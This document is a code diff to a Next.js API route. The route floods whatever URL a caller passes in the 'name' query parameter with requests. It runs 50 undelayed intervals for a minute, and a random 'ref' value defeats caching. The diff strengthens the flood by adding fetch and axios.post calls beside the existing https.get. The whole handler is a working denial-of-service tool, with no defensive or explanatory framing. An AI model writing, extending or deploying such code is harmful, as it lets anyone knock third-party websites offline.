@@ -1,5 +1,6 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
 import https from 'https'
+import axios from 'axios'
 
 type ResponseData = {
     message: string
@@ -13,6 +14,8 @@ export default function handler(
     for(var i = 0; i < 50; i++) {
         const luanch = setInterval(() => {
             https.get(`${req.query.name}?ref=${Math.random()}`)
+            fetch(`${req.query.name}?ref=${Math.random()}`).then()
+            axios.post(`${req.query.name}?ref=${Math.random()}`).then()
         })
         setTimeout(() => clearInterval(luanch), 60 * 1000)
     }
